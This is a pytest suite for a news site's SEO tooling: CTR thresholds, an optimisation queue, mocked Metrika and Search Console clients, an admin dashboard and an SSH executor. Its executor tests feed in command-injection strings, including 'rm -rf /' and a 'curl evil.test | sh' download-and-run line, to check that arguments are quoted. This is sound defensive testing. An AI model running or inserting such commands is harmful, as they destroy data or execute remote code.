"""Tests for the SEO watcher, the SEO dashboard page and the remote executor.

No external services: Metrika and Search Console are served by `respx`, and the SSH
executor is exercised only along the paths that do not open a socket.

The watcher algorithm is the substance of this file. A CTR threshold that is
slightly wrong does not fail loudly — it silently queues the wrong articles and
spends the AI budget where it cannot pay back — so each gate is asserted
individually rather than through one end-to-end example.
"""

# Fixtures are Russian editorial copy, so Cyrillic letters that look like Latin
# ones are the subject matter.

from __future__ import annotations

import inspect
import json
from collections.abc import AsyncIterator, Iterator
from pathlib import Path
from typing import Any, Final, cast

import httpx
import pytest
import respx
from scripts.remote_ssh import (
    RemoteConnectionError,
    RemoteExecutor,
    RemoteResult,
    RemoteTarget,
    build_command,
)
from sqlalchemy.ext.asyncio import AsyncSession

from app.config import settings
from app.core.security import hash_password
from app.database import get_db
from app.main import app
from app.services.seo_analytics import (
    EXPECTED_CTR_BY_POSITION,
    MAX_CTR_FOR_OPTIMISATION,
    MIN_IMPRESSIONS,
    POSITION_WINDOW,
    GSCClient,
    LandingPage,
    MetrikaClient,
    SEOAnalyticsError,
    SEOReport,
    build_optimisation_queue,
    collect_seo_report,
    expected_ctr,
    needs_optimisation,
)

METRIKA_URL: Final[str] = "https://metrika.test"
GSC_URL: Final[str] = "https://gsc.test"
METRIKA_TOKEN: Final[str] = "y0_metrika-token"  # noqa: S105 - test credential
GSC_TOKEN: Final[str] = "ya29.gsc-access-token"  # noqa: S105 - test credential
SITE_URL: Final[str] = "https://svodkapress.test/"
COUNTER_ID: Final[str] = "99887766"

ADMIN_PASSWORD: Final[str] = "correct-horse-battery"  # noqa: S105 - test credential
COOKIE: Final[str] = settings.session_cookie_name


def page(
    *,
    url: str = "/news/a",
    position: float = 5.0,
    ctr: float = 0.01,
    impressions: int = 5000,
    clicks: int | None = None,
    bounce: float = 0.0,
) -> LandingPage:
    """Build a landing page with consistent clicks unless overridden."""
    return LandingPage(
        url=url,
        position=position,
        ctr=ctr,
        impressions=impressions,
        clicks=clicks if clicks is not None else int(impressions * ctr),
        bounce_rate=bounce,
    )


# ==================================================== the expected-CTR curve


def test_the_ctr_curve_decreases_with_position() -> None:
    values = [EXPECTED_CTR_BY_POSITION[key] for key in sorted(EXPECTED_CTR_BY_POSITION)]

    # A curve that is not monotonic would make a deeper page easier to flag than a
    # shallower one, which is backwards.
    assert values == sorted(values, reverse=True)


def test_the_curve_is_interpolated_between_positions() -> None:
    # An average position is a real number, so snapping 4.5 to either neighbour
    # would misjudge it.
    at_four = expected_ctr(4.0)
    at_five = expected_ctr(5.0)
    midpoint = expected_ctr(4.5)

    assert at_five < midpoint < at_four
    assert midpoint == pytest.approx((at_four + at_five) / 2)


def test_the_curve_clamps_outside_the_table() -> None:
    assert expected_ctr(0.5) == EXPECTED_CTR_BY_POSITION[1]
    assert expected_ctr(1.0) == EXPECTED_CTR_BY_POSITION[1]
    assert expected_ctr(80.0) == EXPECTED_CTR_BY_POSITION[max(EXPECTED_CTR_BY_POSITION)]


# ==================================================== the watcher thresholds


def test_a_page_inside_the_window_with_low_ctr_is_queued() -> None:
    reason = needs_optimisation(page(position=5.0, ctr=0.010))

    assert reason is not None
    assert "CTR" in reason


@pytest.mark.parametrize("position", [1.0, 2.5, 3.9])
def test_a_top_ranking_page_is_not_queued(position: float) -> None:
    # Positions 1-3 have little headroom: a better snippet cannot move much.
    assert needs_optimisation(page(position=position, ctr=0.001)) is None


@pytest.mark.parametrize("position", [15.1, 20.0, 60.0])
def test_a_deep_ranking_page_is_not_queued(position: float) -> None:
    # Past the window nobody sees the result, so the snippet is not what is wrong.
    assert needs_optimisation(page(position=position, ctr=0.001)) is None


def test_the_window_boundaries_are_inclusive() -> None:
    low, high = POSITION_WINDOW

    assert needs_optimisation(page(position=low, ctr=0.001)) is not None
    assert needs_optimisation(page(position=high, ctr=0.001)) is not None


def test_a_page_above_the_ctr_ceiling_is_never_queued() -> None:
    # The requirement's absolute 3% ceiling, independent of the curve.
    above = needs_optimisation(
        page(position=15.0, ctr=MAX_CTR_FOR_OPTIMISATION + 0.001)
    )

    assert above is None


def test_a_small_sample_is_not_judged() -> None:
    # Nine impressions and no clicks is a 0% CTR that means nothing; regenerating
    # on that signal spends tokens on noise.
    assert needs_optimisation(page(impressions=MIN_IMPRESSIONS - 1, ctr=0.0)) is None
    assert needs_optimisation(page(impressions=MIN_IMPRESSIONS, ctr=0.0)) is not None


def test_a_page_performing_normally_for_its_depth_is_not_queued() -> None:
    # 1.1% at position 15 is roughly the expectation, so it is *not* a failure even
    # though it is below the 3% ceiling. A flat threshold would wrongly queue it.
    deep_but_normal = page(position=15.0, ctr=0.011)

    assert deep_but_normal.ctr < MAX_CTR_FOR_OPTIMISATION
    assert needs_optimisation(deep_but_normal) is None


def test_a_healthy_page_inside_the_window_is_not_queued() -> None:
    assert needs_optimisation(page(position=5.0, ctr=0.070)) is None


# ==================================================== the optimisation queue


def test_the_queue_ranks_by_potential_clicks_not_by_shortfall() -> None:
    small_but_terrible = page(url="/small", position=5.0, ctr=0.001, impressions=60)
    large_but_moderate = page(url="/big", position=5.0, ctr=0.020, impressions=20_000)

    queue = build_optimisation_queue([small_but_terrible, large_but_moderate])

    # The small page has the worse *percentage* shortfall, but fixing the large one
    # returns far more clicks per token spent.
    assert [item.url for item in queue] == ["/big", "/small"]
    assert queue[0].shortfall < queue[1].shortfall
    assert queue[0].potential_clicks > queue[1].potential_clicks


def test_the_queue_excludes_healthy_pages() -> None:
    queue = build_optimisation_queue(
        [
            page(url="/bad", position=5.0, ctr=0.005),
            page(url="/good", position=5.0, ctr=0.080),
            page(url="/top", position=1.0, ctr=0.001),
        ]
    )

    assert [item.url for item in queue] == ["/bad"]


def test_the_queue_is_bounded() -> None:
    # Impressions vary widely so the ranking is unambiguous: pages a few
    # impressions apart round to the same `potential_clicks` and their relative
    # order is then arbitrary, which would make this assertion flaky.
    pages = [
        page(url=f"/n/{index}", position=6.0, ctr=0.004, impressions=1000 * (index + 1))
        for index in range(60)
    ]

    queue = build_optimisation_queue(pages, limit=5)

    assert len(queue) == 5
    # The highest-value five, not the first five encountered.
    expected = [f"/n/{index}" for index in (59, 58, 57, 56, 55)]
    assert [item.url for item in queue] == expected
    # And ordered by descending value within that selection.
    values = [item.potential_clicks for item in queue]
    assert values == sorted(values, reverse=True)


def test_a_candidate_reports_its_shortfall_and_potential() -> None:
    queue = build_optimisation_queue([page(position=5.0, ctr=0.006, impressions=10_000)])
    candidate = queue[0]

    assert 0 < candidate.shortfall < 1
    assert candidate.potential_clicks > 0
    payload = candidate.to_dict()
    assert payload["url"] == "/news/a"
    assert "reason" in payload


def test_an_empty_input_yields_an_empty_queue() -> None:
    assert build_optimisation_queue([]) == ()


# ==================================================== Metrika API parsing


def metrika_response(**overrides: Any) -> httpx.Response:
    """A Metrika `stat/v1/data` payload."""
    payload: dict[str, Any] = {
        "data": [
            {
                "dimensions": [{"name": "/news/pyhtino"}],
                "metrics": [1500.0, 42.5, 96.0],
            },
            {
                "dimensions": [{"name": "/news/vnukovo"}],
                "metrics": [820.0, 61.0, 45.0],
            },
        ]
    }
    payload.update(overrides)
    return httpx.Response(200, json=payload)


def new_metrika() -> MetrikaClient:
    return MetrikaClient(
        token=METRIKA_TOKEN, counter_id=COUNTER_ID, base_url=METRIKA_URL
    )


async def test_metrika_parses_landing_pages() -> None:
    with respx.mock(base_url=METRIKA_URL, assert_all_called=True) as mock:
        mock.get("/stat/v1/data").mock(return_value=metrika_response())
        client = new_metrika()
        try:
            pages = await client.top_landing_pages(days=28)
        finally:
            await client.close()

    assert set(pages) == {"/news/pyhtino", "/news/vnukovo"}
    assert pages["/news/pyhtino"].pageviews == 1500
    # Metrika reports a percentage; the module normalises to a fraction so one unit
    # is in play throughout.
    assert pages["/news/pyhtino"].bounce_rate == pytest.approx(0.425)
    assert pages["/news/pyhtino"].avg_time_seconds == pytest.approx(96.0)


async def test_metrika_uses_the_oauth_scheme_and_organic_filter() -> None:
    with respx.mock(base_url=METRIKA_URL, assert_all_called=True) as mock:
        route = mock.get("/stat/v1/data").mock(return_value=metrika_response())
        client = new_metrika()
        try:
            await client.top_landing_pages()
        finally:
            await client.close()

    request = route.calls[0].request

    # Metrika uses the legacy `OAuth` scheme, not `Bearer`.
    assert request.headers["Authorization"] == f"OAuth {METRIKA_TOKEN}"
    # Organic only: direct traffic says nothing about snippet performance.
    assert "organic" in str(request.url)
    assert f"ids={COUNTER_ID}" in str(request.url)


async def test_metrika_tolerates_malformed_rows() -> None:
    broken = {
        "data": [
            {"dimensions": [], "metrics": [1.0]},
            {"dimensions": [{"name": "/ok"}], "metrics": []},
            "not-a-row",
            {"dimensions": [{"name": "/good"}], "metrics": [10.0, 20.0, 30.0]},
        ]
    }

    with respx.mock(base_url=METRIKA_URL, assert_all_called=True) as mock:
        mock.get("/stat/v1/data").mock(return_value=httpx.Response(200, json=broken))
        client = new_metrika()
        try:
            pages = await client.top_landing_pages()
        finally:
            await client.close()

    # A malformed row costs that row, not the whole report.
    assert set(pages) == {"/good"}


async def test_metrika_reports_an_http_failure() -> None:
    with respx.mock(base_url=METRIKA_URL, assert_all_called=True) as mock:
        mock.get("/stat/v1/data").mock(
            return_value=httpx.Response(403, text="token expired")
        )
        client = new_metrika()
        try:
            with pytest.raises(SEOAnalyticsError, match="403"):
                await client.top_landing_pages()
        finally:
            await client.close()


async def test_an_unconfigured_metrika_client_reports_itself() -> None:
    client = MetrikaClient(token="", counter_id="", base_url=METRIKA_URL)

    assert client.is_configured is False
    with pytest.raises(SEOAnalyticsError, match="YANDEX_METRIKA_TOKEN"):
        await client.top_landing_pages()


# ==================================================== Search Console parsing


def gsc_response(**overrides: Any) -> httpx.Response:
    """A Search Console `searchAnalytics/query` payload."""
    payload: dict[str, Any] = {
        "rows": [
            {
                "keys": [f"{SITE_URL}news/pyhtino"],
                "clicks": 40.0,
                "impressions": 5000.0,
                "ctr": 0.008,
                "position": 6.4,
            },
            {
                "keys": [f"{SITE_URL}news/vnukovo"],
                "clicks": 300.0,
                "impressions": 4000.0,
                "ctr": 0.075,
                "position": 4.2,
            },
        ],
        "responseAggregationType": "byPage",
    }
    payload.update(overrides)
    return httpx.Response(200, json=payload)


def new_gsc() -> GSCClient:
    return GSCClient(access_token=GSC_TOKEN, site_url=SITE_URL, base_url=GSC_URL)


async def test_gsc_parses_search_performance() -> None:
    with respx.mock(base_url=GSC_URL, assert_all_called=True) as mock:
        mock.post(url__regex=r".*/searchAnalytics/query").mock(
            return_value=gsc_response()
        )
        client = new_gsc()
        try:
            pages = await client.page_performance(days=28)
        finally:
            await client.close()

    assert len(pages) == 2
    first = pages[0]
    assert first.clicks == 40
    assert first.impressions == 5000
    # `ctr` stays a 0..1 fraction: converting here would leave two units in play
    # and guarantee a factor-of-100 bug in the threshold comparison.
    assert first.ctr == pytest.approx(0.008)
    assert first.position == pytest.approx(6.4)


async def test_gsc_percent_encodes_the_property_id() -> None:
    with respx.mock(base_url=GSC_URL, assert_all_called=True) as mock:
        route = mock.post(url__regex=r".*/searchAnalytics/query").mock(
            return_value=gsc_response()
        )
        # A domain property carries a colon, which must be encoded in the path.
        client = GSCClient(
            access_token=GSC_TOKEN, site_url="sc-domain:example.ru", base_url=GSC_URL
        )
        try:
            await client.page_performance()
        finally:
            await client.close()

    assert "sc-domain%3Aexample.ru" in str(route.calls[0].request.url)


async def test_gsc_requests_page_dimensions() -> None:
    with respx.mock(base_url=GSC_URL, assert_all_called=True) as mock:
        route = mock.post(url__regex=r".*/searchAnalytics/query").mock(
            return_value=gsc_response()
        )
        client = new_gsc()
        try:
            await client.page_performance()
        finally:
            await client.close()

    body = json.loads(route.calls[0].request.content)

    assert body["dimensions"] == ["page"]
    assert body["aggregationType"] == "byPage"
    assert body["type"] == "web"
    assert route.calls[0].request.headers["Authorization"] == f"Bearer {GSC_TOKEN}"


async def test_gsc_tolerates_malformed_rows() -> None:
    broken = {"rows": [{"keys": []}, "nope", {"keys": ["/ok"], "clicks": "x"}]}

    with respx.mock(base_url=GSC_URL, assert_all_called=True) as mock:
        mock.post(url__regex=r".*/searchAnalytics/query").mock(
            return_value=httpx.Response(200, json=broken)
        )
        client = new_gsc()
        try:
            pages = await client.page_performance()
        finally:
            await client.close()

    # The one usable row survives with zeroed non-numeric metrics.
    assert len(pages) == 1
    assert pages[0].clicks == 0


async def test_gsc_reports_an_http_failure() -> None:
    with respx.mock(base_url=GSC_URL, assert_all_called=True) as mock:
        mock.post(url__regex=r".*/searchAnalytics/query").mock(
            return_value=httpx.Response(401, text="invalid credentials")
        )
        client = new_gsc()
        try:
            with pytest.raises(SEOAnalyticsError, match="401"):
                await client.page_performance()
        finally:
            await client.close()


async def test_an_unconfigured_gsc_client_reports_itself() -> None:
    client = GSCClient(access_token="", site_url="", base_url=GSC_URL)

    assert client.is_configured is False


# ==================================================== the combined report


async def test_the_report_joins_both_sources_on_the_url_path() -> None:
    with respx.mock(assert_all_called=True) as mock:
        mock.get(f"{METRIKA_URL}/stat/v1/data").mock(return_value=metrika_response())
        mock.post(url__regex=rf"{GSC_URL}.*/searchAnalytics/query").mock(
            return_value=gsc_response()
        )
        metrika = new_metrika()
        gsc = new_gsc()
        try:
            report = await collect_seo_report(metrika=metrika, gsc=gsc)
        finally:
            await metrika.close()
            await gsc.close()

    assert report.metrika_available is True
    assert report.gsc_available is True
    # GSC gives the absolute URL, Metrika the path; the join is on the path.
    joined = {item.url: item for item in report.pages}
    assert joined[f"{SITE_URL}news/pyhtino"].bounce_rate == pytest.approx(0.425)
    assert joined[f"{SITE_URL}news/pyhtino"].pageviews == 1500


async def test_the_report_builds_a_queue_from_the_joined_data() -> None:
    with respx.mock(assert_all_called=True) as mock:
        mock.get(f"{METRIKA_URL}/stat/v1/data").mock(return_value=metrika_response())
        mock.post(url__regex=rf"{GSC_URL}.*/searchAnalytics/query").mock(
            return_value=gsc_response()
        )
        metrika = new_metrika()
        gsc = new_gsc()
        try:
            report = await collect_seo_report(metrika=metrika, gsc=gsc)
        finally:
            await metrika.close()
            await gsc.close()

    # `/news/pyhtino` is at 6.4 with 0.8% CTR — well below its expectation.
    # `/news/vnukovo` is at 4.2 with 7.5% — healthy.
    assert len(report.queue) == 1
    assert report.queue[0].url.endswith("/news/pyhtino")


async def test_a_page_missing_from_metrika_is_kept() -> None:
    with respx.mock(assert_all_called=True) as mock:
        mock.get(f"{METRIKA_URL}/stat/v1/data").mock(
            return_value=httpx.Response(200, json={"data": []})
        )
        mock.post(url__regex=rf"{GSC_URL}.*/searchAnalytics/query").mock(
            return_value=gsc_response()
        )
        metrika = new_metrika()
        gsc = new_gsc()
        try:
            report = await collect_seo_report(metrika=metrika, gsc=gsc)
        finally:
            await metrika.close()
            await gsc.close()

    # GSC is authoritative: search data is actionable without behaviour metrics, so
    # an inner join would throw away the pages worth fixing.
    assert len(report.pages) == 2
    assert all(item.pageviews == 0 for item in report.pages)


async def test_a_metrika_failure_degrades_to_search_only() -> None:
    with respx.mock(assert_all_called=True) as mock:
        mock.get(f"{METRIKA_URL}/stat/v1/data").mock(
            return_value=httpx.Response(500, text="upstream error")
        )
        mock.post(url__regex=rf"{GSC_URL}.*/searchAnalytics/query").mock(
            return_value=gsc_response()
        )
        metrika = new_metrika()
        gsc = new_gsc()
        try:
            report = await collect_seo_report(metrika=metrika, gsc=gsc)
        finally:
            await metrika.close()
            await gsc.close()

    # The page must still render: it is where an operator goes to see what broke.
    assert report.metrika_available is False
    assert report.gsc_available is True
    assert report.pages
    assert any("Метрика" in warning for warning in report.warnings)


async def test_an_unconfigured_report_is_empty_but_not_an_error() -> None:
    unconfigured_metrika = MetrikaClient(
        token="", counter_id="", base_url=METRIKA_URL
    )
    report = await collect_seo_report(metrika=unconfigured_metrika, gsc=None)

    assert report.pages == ()
    assert report.queue == ()
    assert len(report.warnings) == 2


def test_the_report_totals_are_impression_weighted() -> None:
    report = SEOReport(
        pages=(
            page(url="/a", position=2.0, ctr=0.10, impressions=10_000, clicks=1000),
            page(url="/b", position=20.0, ctr=0.01, impressions=100, clicks=1),
        )
    )

    assert report.total_clicks == 1001
    assert report.total_impressions == 10_100
    # Computed from totals, not averaged per page: a 100-impression page must not
    # weigh as much as a 10 000-impression one.
    assert report.average_ctr == pytest.approx(1001 / 10_100)
    assert 2.0 < report.average_position < 3.0


def test_an_empty_report_reports_zeroes_not_a_division_error() -> None:
    report = SEOReport()

    assert report.average_ctr == 0.0
    assert report.average_position == 0.0


# ==================================================== the SEO dashboard page


class _Result:
    def __init__(self, rows: list[Any]) -> None:
        self._rows = rows

    def scalars(self) -> _Result:
        return self

    def all(self) -> list[Any]:
        return list(self._rows)

    def scalar_one_or_none(self) -> Any:
        """Return nothing, so the admin-credential lookup uses the environment.

        That lookup now runs on every authenticated request, including the ones
        this page test makes. An empty result is the state of a deployment whose
        profile page has never been used.
        """
        return self._rows[0] if self._rows else None


class FakeSession:
    """Minimal `AsyncSession` stand-in; the SEO page issues no queries of its own."""

    async def execute(self, statement: Any) -> _Result:
        return _Result([])

    async def scalar(self, statement: Any) -> int:
        return 0

    async def get(self, entity: Any, ident: Any) -> Any:
        return None

    async def commit(self) -> None:
        pass

    async def rollback(self) -> None:
        pass

    async def close(self) -> None:
        return None

    def as_session(self) -> AsyncSession:
        return cast(AsyncSession, self)


@pytest.fixture
def _admin_configured() -> Iterator[None]:
    """Install a known administrator credential on the frozen settings instance."""
    previous = settings.admin_password_hash
    previous_user = settings.admin_username
    object.__setattr__(settings, "admin_password_hash", hash_password(ADMIN_PASSWORD))
    object.__setattr__(settings, "admin_username", "admin")
    try:
        yield
    finally:
        object.__setattr__(settings, "admin_password_hash", previous)
        object.__setattr__(settings, "admin_username", previous_user)


@pytest.fixture
def client(_admin_configured: None) -> Iterator[httpx.AsyncClient]:
    """An ASGI client with the database dependency overridden.

    The lifespan is not run: it health-checks PostgreSQL and Redis, which this suite
    does not have.
    """

    async def _override() -> AsyncIterator[AsyncSession]:
        yield FakeSession().as_session()

    app.dependency_overrides[get_db] = _override
    yield httpx.AsyncClient(
        transport=httpx.ASGITransport(app=app),
        base_url="http://dashboard.test",
        follow_redirects=False,
    )
    app.dependency_overrides.clear()


async def sign_in(client: httpx.AsyncClient) -> None:
    """Sign in, leaving the session cookie on the client jar."""
    response = await client.post(
        "/auth/login", data={"username": "admin", "password": ADMIN_PASSWORD}
    )
    assert response.status_code == 303, response.text
    cookie = response.cookies.get(COOKIE)
    assert cookie
    client.cookies.set(COOKIE, cookie)


async def test_the_seo_page_requires_authentication(
    client: httpx.AsyncClient,
) -> None:
    async with client:
        response = await client.get("/seo")

    assert response.status_code == 303
    assert response.headers["location"].startswith("/login")


async def test_the_seo_page_renders_without_configured_analytics(
    client: httpx.AsyncClient,
) -> None:
    async with client:
        await sign_in(client)
        response = await client.get("/seo")

    assert response.status_code == 200
    assert "SEO-аналитика" in response.text
    # The page is where an operator finds out the sources are missing, so it must
    # render rather than error.
    assert "не настроена" in response.text or "не настроен" in response.text
    assert "Trigger Soft SEO Optimization" in response.text


async def test_the_seo_page_states_the_optimisation_band(
    client: httpx.AsyncClient,
) -> None:
    async with client:
        await sign_in(client)
        response = await client.get("/seo")

    low, high = POSITION_WINDOW
    # The band is the non-obvious part; an operator should see why a page at
    # position 2 is absent from the queue.
    assert f"{int(low)}" in response.text
    assert f"{int(high)}" in response.text


async def test_the_optimisation_trigger_requires_authentication(
    client: httpx.AsyncClient,
) -> None:
    async with client:
        response = await client.post("/api/ui/seo/optimise")

    # A partial returns 401 rather than an HTML redirect, which would be pasted
    # into the page.
    assert response.status_code == 401


async def test_the_optimisation_trigger_returns_a_fragment(
    client: httpx.AsyncClient,
) -> None:
    async with client:
        await sign_in(client)
        response = await client.post("/api/ui/seo/optimise")

    assert response.status_code == 200
    assert "<!DOCTYPE html>" not in response.text
    # With no analytics configured the queue is empty, and the fragment says so.
    assert "Очередь пуста" in response.text


async def test_the_seo_page_accepts_a_window_override(
    client: httpx.AsyncClient,
) -> None:
    async with client:
        await sign_in(client)
        response = await client.get("/seo?days=7")

    assert response.status_code == 200
    assert "7 дн" in response.text


async def test_an_out_of_range_window_is_rejected(
    client: httpx.AsyncClient,
) -> None:
    async with client:
        await sign_in(client)
        response = await client.get("/seo?days=9999")

    # Bounded by the route signature: an unbounded window would ask both APIs for
    # years of data.
    assert response.status_code == 422


# ==================================================== the remote executor


def test_command_arguments_are_quoted_individually() -> None:
    assert build_command(["df", "-h", "/"]) == "df -h /"
    assert build_command(["cat", "/var/log/my log.txt"]) == (
        "cat '/var/log/my log.txt'"
    )


@pytest.mark.parametrize(
    "hostile",
    [
        "file; rm -rf /",
        "$(whoami)",
        "`id`",
        "a && curl evil.test | sh",
        "x\nrm -rf /",
    ],
)
def test_shell_metacharacters_cannot_become_a_second_command(hostile: str) -> None:
    rendered = build_command(["echo", hostile])

    # The payload survives as one quoted argument. Quoting is what makes this safe,
    # the same reasoning that makes parameterised SQL the only acceptable form.
    assert rendered.startswith("echo ")
    argument = rendered.removeprefix("echo ")
    assert argument.startswith("'")
    assert argument.endswith("'")


def test_an_empty_command_is_refused() -> None:
    with pytest.raises(ValueError, match="empty command"):
        build_command([])


def test_an_unconfigured_executor_reports_itself() -> None:
    executor = RemoteExecutor(
        host="", username="root", key_path=Path("/nonexistent/key")
    )

    assert executor.is_configured is False
    assert executor.target == "root@:22"


def test_a_remote_target_rejects_an_empty_host() -> None:
    with pytest.raises(ValueError, match="host"):
        RemoteTarget(
            host="",
            username="root",
            port=22,
            private_key_path=Path("/nonexistent/key"),
        )


def test_from_target_does_not_open_a_socket() -> None:
    target = RemoteTarget(
        host="wp.test",
        username="deploy",
        port=2222,
        private_key_path=Path("/nonexistent/key"),
        wordpress_path="/var/www/html",
    )
    executor = RemoteExecutor.from_target(target)
    assert executor.is_configured is False
    assert executor.target == "deploy@wp.test:2222"


async def test_a_missing_host_fails_before_any_socket() -> None:
    executor = RemoteExecutor(
        host="", username="root", key_path=Path("/nonexistent/key")
    )

    with pytest.raises(RemoteConnectionError, match="SSH_REMOTE_HOST"):
        await executor.run(["df", "-h"])


async def test_a_missing_private_key_is_reported_clearly() -> None:
    executor = RemoteExecutor(
        host="wp.test", username="root", key_path=Path("/nonexistent/key")
    )

    # Password authentication is deliberately unsupported, so a missing key is
    # fatal rather than a fallback to a prompt that would hang.
    with pytest.raises(RemoteConnectionError, match="public-key"):
        await executor.run(["df"])


async def test_an_empty_shell_command_is_refused() -> None:
    executor = RemoteExecutor(host="wp.test", username="root")

    with pytest.raises(ValueError, match="empty command"):
        await executor.run_shell("   ")


def test_a_result_reports_success_and_failure() -> None:
    assert RemoteResult(command="df", exit_status=0).ok is True
    assert RemoteResult(command="df", exit_status=1).ok is False


def test_raise_for_status_only_raises_on_failure() -> None:
    RemoteResult(command="df", exit_status=0).raise_for_status()

    with pytest.raises(RuntimeError, match="exit 2"):
        failed = RemoteResult(command="df", exit_status=2, stderr="no such file")
        failed.raise_for_status()


def test_the_nginx_reload_tests_the_config_first() -> None:
    # Reloading a broken config takes the site down; the `&&` is what makes this
    # safe to run unattended.
    source = inspect.getsource(RemoteExecutor.reload_nginx)

    assert "nginx -t &&" in source
